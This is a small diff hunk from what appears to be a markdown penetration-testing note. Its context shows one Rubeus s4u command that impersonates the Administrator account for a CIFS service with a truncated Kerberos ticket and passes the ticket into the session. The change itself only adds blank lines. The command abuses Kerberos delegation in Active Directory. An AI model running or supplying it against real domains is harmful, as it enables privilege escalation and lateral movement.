@@ -15,3 +15,5 @@ updated_at: '2023-04-10T20:26:26.278263+00:00'
 ```bash
 Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:cifs/srv.domain.local /ticket:doIFRjCCBUKgAwIBB...BTA== /ptt
 ```
+
+
